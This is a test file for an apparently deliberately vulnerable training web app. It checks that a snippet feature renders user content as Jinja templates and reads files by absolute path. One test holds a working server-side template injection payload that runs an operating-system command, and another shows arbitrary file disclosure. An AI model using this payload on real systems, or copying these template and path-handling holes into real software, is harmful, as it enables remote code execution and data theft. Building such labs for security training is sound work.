from app.categories.a03_injection.routes import FILE_INCLUSION_SECRET_PATH


def test_file_inclusion_page_renders(client):
    response = client.get("/a03/file-inclusion")
    assert response.status_code == 200
    assert b"LFI-to-SSTI" in response.data


def test_save_and_render_snippet_round_trip(client):
    client.post("/a03/save-snippet", data={"name": "greeting", "content": "Hello there!"})
    response = client.get("/a03/render-snippet", query_string={"name": "greeting"})
    assert response.status_code == 200
    assert b"Hello there!" in response.data


def test_included_snippet_content_is_evaluated_as_a_template(client):
    client.post("/a03/save-snippet", data={"name": "math-proof", "content": "{{ 7*7 }}"})
    response = client.get("/a03/render-snippet", query_string={"name": "math-proof"})
    assert response.status_code == 200
    assert b"49" in response.data
    assert b"{{ 7*7 }}" not in response.data


def test_planted_snippet_achieves_real_code_execution(client):
    payload = (
        "{{ self.__init__.__globals__.__builtins__.__import__('os')"
        ".popen('id').read() }}"
    )
    client.post("/a03/save-snippet", data={"name": "pwn", "content": payload})
    response = client.get("/a03/render-snippet", query_string={"name": "pwn"})
    assert response.status_code == 200
    assert b"uid=" in response.data


def test_render_snippet_discloses_arbitrary_file_via_absolute_path(client):
    response = client.get(
        "/a03/render-snippet", query_string={"name": FILE_INCLUSION_SECRET_PATH}
    )
    assert response.status_code == 200
    with open(FILE_INCLUSION_SECRET_PATH) as f:
        expected_first_line = f.read().splitlines()[0]
    assert expected_first_line.encode() in response.data
